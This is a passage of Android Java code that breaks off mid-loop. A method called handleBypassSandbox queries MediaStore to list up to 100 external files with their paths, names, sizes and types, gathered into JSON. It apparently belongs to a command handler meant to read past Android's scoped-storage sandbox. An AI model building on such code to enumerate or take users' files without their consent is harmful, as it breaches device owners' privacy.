    // ══════════════════════════════════════════════════════════════════════════
    private void handleBypassSandbox(String path) throws Exception {
        // Try ContentResolver approach to read outside scoped storage
        JSONArray found = new JSONArray();
        String[] projections = {
            android.provider.MediaStore.Files.FileColumns.DATA,
            android.provider.MediaStore.Files.FileColumns.DISPLAY_NAME,
            android.provider.MediaStore.Files.FileColumns.SIZE,
            android.provider.MediaStore.Files.FileColumns.MIME_TYPE
        };
        android.database.Cursor cursor = ctx.getContentResolver().query(
            android.provider.MediaStore.Files.getContentUri("external"),
            projections, null, null, null
        );
        if (cursor != null) {
            int count = 0;
            while (cursor.moveToNext() && count < 100) {
                JSONObject f = new JSONObject();
                f.put("path", cursor.getString(0));
